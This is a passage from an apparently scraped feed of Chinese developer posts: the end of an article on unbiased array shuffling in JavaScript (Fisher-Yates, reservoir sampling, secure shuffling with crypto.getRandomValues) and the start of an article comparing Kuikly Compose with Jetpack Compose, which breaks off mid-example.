<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18b6d5d07b3d46b1bafee43a3f4d85e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW15X3lhbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764571005&amp;x-signature=56eiksmyC%2BKF26Toy8xVJffxUW0%3D" alt="image.png" loading="lazy"/></p>
<p>这种"从后往前，随机交换"的策略确保了每个元素都有均等的机会出现在任何位置，实现了真正的均匀随机分布。</p>
<h4 data-id="heading-4">Fisher-Yates算法的JavaScript实现</h4>
<p>用JavaScript实现Fisher-Yates算法非常简单：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fisherYatesShuffle</span>(<span class="hljs-params">array</span>) {
  <span class="hljs-comment">// 创建数组副本，避免修改原数组</span>
  <span class="hljs-keyword">const</span> newArray = [...array];
  <span class="hljs-comment">// 从最后一个元素开始</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = newArray.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i &gt; <span class="hljs-number">0</span>; i--) {
    <span class="hljs-comment">// 随机生成一个0到i的索引</span>
    <span class="hljs-keyword">const</span> j = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * (i + <span class="hljs-number">1</span>));
    <span class="hljs-comment">// 交换元素</span>
    [newArray[i], newArray[j]] = [newArray[j], newArray[i]];
  }
  <span class="hljs-keyword">return</span> newArray;
}

<span class="hljs-comment">// 优化后的随机抽取函数</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">getRandomQuestions</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> shuffled = <span class="hljs-title function_">fisherYatesShuffle</span>(sampleQuestions);
  <span class="hljs-keyword">return</span> shuffled.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>);
};
</code></pre>
<p>这段代码首先创建数组副本（避免修改原数组），然后从数组末尾开始，每次随机选择一个前面的元素进行交换。<strong>这种实现的时间复杂度是O(n)，比排序法的O(n log n)更高性能</strong>，同时随机性也更可靠。</p>
<h3 data-id="heading-5">两种方法的全方位对比</h3>
<p>为了更直观地展示两种方法的差异，我们来看一组对比：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6436d72ddb724b438cea020a63d6cab6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW15X3lhbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764571005&amp;x-signature=%2BAuRWX0icW5wUoRHdXrJ6rS8tLo%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-6">1. 随机性对比</h4>
<p>我们用统计学方法检验两种算法的随机性。对包含10个元素的数组进行10万次洗牌，计算每个元素在每个位置出现的频率标准差（标准差越小，随机性越均匀）：</p>
<ul>
<li>排序法：标准差 0.082（不均匀）</li>
<li>Fisher-Yates算法：标准差 0.003（接近理想均匀分布）</li>
</ul>
<p>Fisher-Yates算法的标准差远小于排序法，说明其随机性分布更均匀。</p>
<h4 data-id="heading-7">2. 性能对比</h4>
<p>在Chrome浏览器中对不同大小的数组进行1000次洗牌的平均耗时（单位：毫秒）：</p>



































<table><thead><tr><th>数组大小</th><th>排序法</th><th>Fisher-Yates算法</th><th>性能提升</th></tr></thead><tbody><tr><td>10个元素</td><td>0.02ms</td><td>0.005ms</td><td>400%</td></tr><tr><td>100个元素</td><td>0.15ms</td><td>0.03ms</td><td>500%</td></tr><tr><td>1000个元素</td><td>1.8ms</td><td>0.25ms</td><td>720%</td></tr><tr><td>10000个元素</td><td>22ms</td><td>2.1ms</td><td>1047%</td></tr></tbody></table>
<p>可以看到，随着数组增大，Fisher-Yates算法的性能优势越来越明显，这是因为其时间复杂度更低（O(n) vs O(n log n)）。</p>
<h3 data-id="heading-8">深入理解：伪随机数生成器</h3>
<p>说到随机排序，就不得不提<strong>伪随机数生成器（PRNG）</strong> 。JavaScript中的Math.random()就是一个PRNG，它通过确定性算法生成看似随机的数字序列。</p>
<p>Math.random()生成的是[0, 1)区间的浮点数，其实现依赖于操作系统提供的随机数种子。在V8引擎中，它使用的是xorshift128+算法，这是一种高效的伪随机数生成算法，但<strong>不适合加密场景</strong>（加密需要用crypto.getRandomValues()）。</p>
<p>在Fisher-Yates算法中，我们用Math.floor(Math.random() * (i + 1))来生成随机索引。这里需要注意：</p>
<ul>
<li>Math.random()生成的是均匀分布的随机数</li>
<li>(i + 1)确保随机索引的范围是[0, i]</li>
<li>Math.floor将浮点数转换为整数索引</li>
</ul>
<p>这种实现能够保证每个索引被选中的概率相等，是Fisher-Yates算法公平性的关键。</p>
<h3 data-id="heading-9">实战优化：从随机排序到业务场景</h3>
<p>现在我们已经掌握了Fisher-Yates算法的原理和实现，接下来看看如何将其应用到实际业务中，并解决一些常见问题。</p>
<h4 data-id="heading-10">1. 处理数组长度不足的情况</h4>
<p>如果原数组长度小于要抽取的数量，我们应该返回原数组（或抛出提示），而不是返回空数组或重复元素：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">getRandomQuestions</span> = (<span class="hljs-params">count = <span class="hljs-number">5</span></span>) =&gt; {
  <span class="hljs-keyword">if</span> (sampleQuestions.<span class="hljs-property">length</span> &lt;= count) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">"数组长度不足，返回原数组"</span>);
    <span class="hljs-keyword">return</span> [...sampleQuestions];
  }
  <span class="hljs-keyword">const</span> shuffled = <span class="hljs-title function_">fisherYatesShuffle</span>(sampleQuestions);
  <span class="hljs-keyword">return</span> shuffled.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, count);
};
</code></pre>
<h4 data-id="heading-11">2. 实现不重复随机抽取</h4>
<p>有时候我们需要从数组中随机抽取不重复的元素，比如抽奖系统中不能重复中奖：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RandomPicker</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">items</span>) {
    <span class="hljs-comment">// 初始化待选池</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">candidates</span> = [...items];
  }

  <span class="hljs-title function_">pick</span>(<span class="hljs-params">count = <span class="hljs-number">1</span></span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">candidates</span>.<span class="hljs-property">length</span> &lt; count) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"剩余元素不足"</span>);
    }

    <span class="hljs-keyword">const</span> result = [];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) {
      <span class="hljs-comment">// 从待选池中随机选择一个元素</span>
      <span class="hljs-keyword">const</span> index = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable language_">this</span>.<span class="hljs-property">candidates</span>.<span class="hljs-property">length</span>);
      <span class="hljs-keyword">const</span> [picked] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">candidates</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>);
      result.<span class="hljs-title function_">push</span>(picked);
    }

    <span class="hljs-keyword">return</span> result;
  }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">const</span> picker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomPicker</span>(sampleQuestions);
<span class="hljs-keyword">const</span> firstPick = picker.<span class="hljs-title function_">pick</span>(<span class="hljs-number">5</span>); <span class="hljs-comment">// 第一次抽取5个</span>
<span class="hljs-keyword">const</span> secondPick = picker.<span class="hljs-title function_">pick</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">// 第二次抽取3个（不重复）</span>
</code></pre>
<h4 data-id="heading-12">3. 优化大数据量的随机抽取</h4>
<p>如果需要从十万甚至百万级别的大数据中随机抽取少量元素，完整洗牌效率太低。这时候可以使用<strong>蓄水池抽样算法</strong>（Reservoir Sampling），它能在O(n)时间和O(k)空间内（k为抽取数量）完成随机抽样：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">reservoirSampling</span>(<span class="hljs-params">items, k</span>) {
  <span class="hljs-keyword">const</span> result = [];

  <span class="hljs-comment">// 先填满蓄水池</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; k &amp;&amp; i &lt; items.<span class="hljs-property">length</span>; i++) {
    result.<span class="hljs-title function_">push</span>(items[i]);
  }

  <span class="hljs-comment">// 处理剩余元素</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = k; i &lt; items.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-comment">// 生成[0, i]的随机索引</span>
    <span class="hljs-keyword">const</span> j = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * (i + <span class="hljs-number">1</span>));
    <span class="hljs-comment">// 如果随机索引在蓄水池范围内，则替换</span>
    <span class="hljs-keyword">if</span> (j &lt; k) {
      result[j] = items[i];
    }
  }

  <span class="hljs-keyword">return</span> result;
}

<span class="hljs-comment">// 从100万条数据中随机抽取10条</span>
<span class="hljs-keyword">const</span> largeData = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({<span class="hljs-attr">length</span>: <span class="hljs-number">1000000</span>}, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> i);
<span class="hljs-keyword">const</span> sample = <span class="hljs-title function_">reservoirSampling</span>(largeData, <span class="hljs-number">10</span>);
</code></pre>
<p>这种算法特别适合处理流式数据或无法一次性加载到内存的大数据集。</p>
<h3 data-id="heading-13">常见问题解答</h3>
<h4 data-id="heading-14">Q1: 为什么Array.sort(() =&gt; Math.random() - 0.5)的随机性不好？</h4>
<p>A1: 因为sort方法的比较函数期望返回一个稳定的排序依据，而随机比较函数会导致排序算法的不稳定。不同浏览器的排序实现对这种不稳定比较的处理方式不同，导致元素位置的概率分布不均匀。此外，这种方法的时间复杂度是O(n log n)，性能也不如Fisher-Yates算法。</p>
<h4 data-id="heading-15">Q2: Fisher-Yates算法可以用于加密场景吗？</h4>
<p>A2: 不建议。因为Math.random()生成的伪随机数不够安全，可能被预测。在加密场景（如随机密码生成）中，应该使用crypto.getRandomValues()：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">secureShuffle</span>(<span class="hljs-params">array</span>) {
  <span class="hljs-keyword">const</span> newArray = [...array];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = newArray.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i &gt; <span class="hljs-number">0</span>; i--) {
    <span class="hljs-comment">// 使用crypto生成安全的随机数</span>
    <span class="hljs-keyword">const</span> uint32 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(<span class="hljs-number">1</span>);
    crypto.<span class="hljs-title function_">getRandomValues</span>(uint32);
    <span class="hljs-keyword">const</span> j = uint32[<span class="hljs-number">0</span>] % (i + <span class="hljs-number">1</span>);
    [newArray[i], newArray[j]] = [newArray[j], newArray[i]];
  }
  <span class="hljs-keyword">return</span> newArray;
}
</code></pre>
<h4 data-id="heading-16">Q3: 如何验证一个随机排序算法的公平性？</h4>
<p>A3: 可以通过以下方法验证：</p>
<ol>
<li><strong>频率测试</strong>：多次运行算法，统计每个元素在每个位置出现的频率，应该接近均匀分布。</li>
<li><strong>序列测试</strong>：检查元素之间的相对顺序是否随机。</li>
<li><strong>间隙测试</strong>：检查随机序列中特定模式（如连续数字）的出现频率是否符合随机分布预期。</li>
</ol>
<p>对于前端开发，可以使用统计学库如seedrandom或stats.js来进行更专业的随机性测试。</p>
<h3 data-id="heading-17">总结：编写可靠随机排序的最佳实践</h3>
<p>通过本文的分析，我们可以得出以下结论：</p>
<ol>
<li><strong>避免使用Array.sort(() =&gt; 0.5 - Math.random())</strong> ：这种方法随机性差，性能低。</li>
<li><strong>优先使用Fisher-Yates算法</strong>：它能提供均匀的随机性和高效的性能（O(n)时间复杂度）。</li>
<li><strong>注意数组副本</strong>：在洗牌时应该创建数组副本，避免修改原数组。</li>
<li><strong>根据场景选择随机源</strong>：普通场景用Math.random()，加密场景用crypto.getRandomValues()。</li>
<li><strong>大数据用蓄水池抽样</strong>：从海量数据中随机抽取少量元素时，蓄水池抽样算法更高效。</li>
</ol>
<p>最后，我们再来回顾一下优化后的随机抽取函数：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//  Fisher-Yates洗牌算法实现</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fisherYatesShuffle</span>(<span class="hljs-params">array</span>) {
  <span class="hljs-keyword">const</span> newArray = [...array];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = newArray.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i &gt; <span class="hljs-number">0</span>; i--) {
    <span class="hljs-keyword">const</span> j = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * (i + <span class="hljs-number">1</span>));
    [newArray[i], newArray[j]] = [newArray[j], newArray[i]];
  }
  <span class="hljs-keyword">return</span> newArray;
}

<span class="hljs-comment">// 业务函数：随机抽取5个问题</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">getRandomQuestions</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (sampleQuestions.<span class="hljs-property">length</span> &lt;= <span class="hljs-number">5</span>) <span class="hljs-keyword">return</span> [...sampleQuestions];
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">fisherYatesShuffle</span>(sampleQuestions).<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>);
};
</code></pre>
<p>希望本文能帮助你理解JavaScript中随机排序的原理和陷阱，写出更可靠、更高性能的随机抽取代码。记住：<strong>看似简单的随机问题，往往隐藏着深刻的计算机科学原理</strong>，深入理解这些原理，才能写出真正优秀的代码。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kuikly Compose vs. Jetpack Compose：一套代码实现真正的全平台原生渲染]]></title>    <link>https://juejin.cn/post/7575757258834051098</link>    <guid>https://juejin.cn/post/7575757258834051098</guid>    <pubDate>2025-11-24T06:37:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575757258834051098" data-draft-id="7575757258834034714" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kuikly Compose vs. Jetpack Compose：一套代码实现真正的全平台原生渲染"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-24T06:37:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="芒鸽"/> <meta itemprop="url" content="https://juejin.cn/user/624178334269613"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kuikly Compose vs. Jetpack Compose：一套代码实现真正的全平台原生渲染
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/624178334269613/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    芒鸽
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:37:14.000Z" title="Mon Nov 24 2025 06:37:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>告别多平台开发的技术栈分裂，体验 Kotlin 的跨端魅力</p>
</blockquote>
<p>随着 Kotlin 声明式 UI 框架 Jetpack Compose 的成熟，其简洁的语法和高效的开发体验赢得了大量 Android 开发者的青睐。但当我们面临多平台开发需求时，痛点也随之而来：iOS 需要学习 SwiftUI，鸿蒙需要掌握 ArkTS，Web 前端又有自己的一套技术栈……</p>
<p>腾讯开源的 <strong>Kuikly Compose</strong> 正是为了解决这一核心痛点而生。它并非另一个孤立的 UI 框架，而是基于 Kuikly 核心跨平台渲染引擎，对标准 Compose DSL 进行的跨端适配。今天，让我们深入探讨这两者的区别，并详细了解 Kuikly Compose 强大的跨端组件支持。</p>
<h2 data-id="heading-0">一、核心理念：单平台方案 vs 真跨端解决方案</h2>
<p>这是两者最根本的区别，决定了它们的所有技术特性和应用场景。</p>
<p><strong>Jetpack Compose：Android 的专属现代化工具包</strong></p>
<ul>
<li><strong>定位</strong>：专为 Android 平台设计的现代 UI 工具包</li>
<li><strong>深度集成</strong>：与 Android 生态系统紧密耦合</li>
<li><strong>渲染方式</strong>：基于 Skia 自绘引擎，在 Android Canvas 上直接绘制</li>
<li><strong>目标平台</strong>：仅限 Android</li>
</ul>
<p><strong>Kuikly Compose：Kotlin 全栈跨端的桥梁</strong></p>
<ul>
<li><strong>定位</strong>：基于 KMP 的跨平台 UI 框架，提供 Compose DSL 兼容层</li>
<li><strong>核心价值</strong>：使用熟悉的 Compose 语法，驱动跨平台原生渲染引擎</li>
<li><strong>目标平台</strong>：Android、iOS、鸿蒙 (OpenHarmony)、H5 (Beta)、微信小程序 (Beta)，并规划支持 Desktop</li>
<li><strong>核心承诺</strong>："一次编写，原生渲染多端"</li>
</ul>
<p>为了更清晰地展示两者的技术差异，请看下面的对比表格：</p>


















































<table><thead><tr><th>对比维度</th><th>Jetpack Compose (Android)</th><th>Kuikly Compose (Multi-Platform)</th></tr></thead><tbody><tr><td><strong>核心架构</strong></td><td>基于 Skia 的自绘引擎</td><td>基于 Kuikly Core 的原生渲染引擎</td></tr><tr><td><strong>渲染方式</strong></td><td>在 Android Canvas 上自绘</td><td>调用各平台原生 UI 组件进行渲染</td></tr><tr><td><strong>跨平台支持</strong></td><td>仅限 Android</td><td>真正的全平台支持</td></tr><tr><td><strong>动态化能力</strong></td><td>不支持</td><td>支持（可编译为 JS Bundle 动态下发）</td></tr><tr><td><strong>性能特点</strong></td><td>高帧率，但有引擎启动开销</td><td>原生性能，无额外引擎启动耗时</td></tr><tr><td><strong>包体积影响</strong></td><td>较大（需携带 Skia 引擎）</td><td>极小（运行时轻量）</td></tr><tr><td><strong>一致性保障</strong></td><td>绝对一致（自绘保证）</td><td>高一致性（通过架构保障）</td></tr><tr><td><strong>学习成本</strong></td><td>需学习 Compose 范式</td><td>Compose 开发者零成本上手</td></tr></tbody></table>
<h2 data-id="heading-1">二、技术架构：自绘引擎 vs 原生渲染引擎</h2>
<p>这个技术分水岭直接导致了性能、包体积和用户体验的根本差异。</p>
<h3 data-id="heading-2">Jetpack Compose 的渲染路径</h3>
<pre><code class="hljs language-css" lang="css">Compose <span class="hljs-selector-tag">Code</span> → Skia Engine → Android <span class="hljs-selector-tag">Canvas</span>
</code></pre>
<p>你的 Compose 代码被编译成 Android 字节码，在运行时通过 Skia 图形库直接在应用 Surface 上进行绘制。它绕过了 Android 系统的原生控件，实现了完全的自绘制。</p>
<h3 data-id="heading-3">Kuikly Compose 的渲染路径</h3>
<pre><code class="hljs language-css" lang="css">Compose <span class="hljs-selector-tag">Code</span> → Kuikly Core → Native UI Components (UIKit/ArkUI/View, etc.)
</code></pre>
<p>你的 Compose 代码通过 KMP 编译器生成对应平台的原生库，Kuikly Core 负责解析布局逻辑，通过通用渲染层直接调用各平台原生组件：</p>
<ul>
<li><strong>iOS</strong>：Text 组件映射为 <code>UILabel</code></li>
<li><strong>鸿蒙</strong>：Text 组件映射为 <code>Text</code> 组件</li>
<li><strong>Android</strong>：Text 组件映射为 <code>TextView</code></li>
</ul>
<p><strong>这种架构带来的核心优势：</strong></p>
<p>🚀 <strong>真正的原生性能</strong>：使用平台原生 UI 组件，滚动、动画、字体渲染等体验与纯原生应用完全一致</p>
<p>🔗 <strong>无缝平台集成</strong>：轻松与现有原生页面、第三方 SDK 混合开发，无性能瓶颈</p>
<p>📦 <strong>极小的包体积</strong>：无需携带庞大的 Skia 引擎，应用体积更小</p>
<h2 data-id="heading-4">三、Kuikly Compose 跨端组件深度解析</h2>
<p>Kuikly Compose 致力于提供与 Jetpack Compose 高度一致的开发体验。当前 Beta 版本已支持绝大多数核心 API，让开发者能够平滑过渡。</p>
<h3 data-id="heading-5">1. 全面覆盖的基础组件</h3>
<p><strong>布局组件</strong></p>
<ul>
<li><code>Column</code>、<code>Row</code>、<code>Box</code> - 完全支持 Compose 的布局模型</li>
<li>完整的修饰符系统支持，包括 <code>padding</code>、<code>size</code>、<code>background</code> 等</li>
</ul>
<p><strong>基础 UI 组件</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 文本显示 - 全平台原生渲染</span>
Text(
    text = <span class="hljs-string">"Hello Kuikly!"</span>,
    color = Color.Blue,
    fontSize = <span class="hljs-number">18.</span>sp,
    modifier = Modifier.padding(<span class="hljs-number">16.</span>dp)
)

<span class="hljs-comment">// 按钮组件 - 原生交互体验</span>
Button(
    onClick = { <span class="hljs-comment">/* 处理点击 */</span> },
    colors = ButtonDefaults.buttonColors(backgroundColor = Color.Material)
) {
    Text(<span class="hljs-string">"点击我"</span>)
}

<span class="hljs-comment">// 图片组件 - 支持多种源</span>
Image(
    painter = rememberImagePainter(<span class="hljs-string">"https://example.com/image.jpg"</span>),
    contentDescription = <span class="hljs-string">"网络图片"</span>
)
</code></pre>
<p><strong>容器与交互组件</strong></p>
<ul>
<li><code>LazyColumn</code> / <code>LazyRow</code> - 高性能列表，支持大量数据</li>
<li><code>ModalBottomSheet</code>、<code>Dialog</code> - 模态弹窗组件</li>
<li><code>Scaffold</code>、<code>TopAppBar</code> -  Material 设计脚手架</li>
</ul>
<h3 data-id="heading-6">2. 完整的状态管理与动画系统</h3>
<p><strong>响应式状态管理</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Page(<span class="hljs-string">"CounterPage"</span>)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CounterPage</span> : <span class="hljs-type">ComposeContainer</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">willInit</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.willInit()
        setContent {
            <span class="hljs-keyword">var</span> count <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-number">0</span>) }
            
            Column(
                modifier = Modifier.padding(<span class="hljs-number">16.</span>dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text(<span class="hljs-string">"计数器: <span class="hljs-variable">$count</span>"</span>, style = MaterialTheme.typography.h4)
                
                Button(onClick = { count++ }) {
                    Text(<span class="hljs-string">"增加"</span>)
                }
            }
        }
    }
}
</code></pre>
<p><strong>流畅的动画支持</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">var</span> expanded <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-literal">false</span>) }
<span class="hljs-keyword">val</span> rotateAnim <span class="hljs-keyword">by</span> animateFloatAsState(
    targetValue = <span class="hljs-keyword">if</span> (expanded) <span class="hljs-number">180f</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0f</span>
)

Icon(
    imageVector = Icons.Default.ExpandMore,
    contentDescription = <span class="hljs-string">"展开图标"</span>,
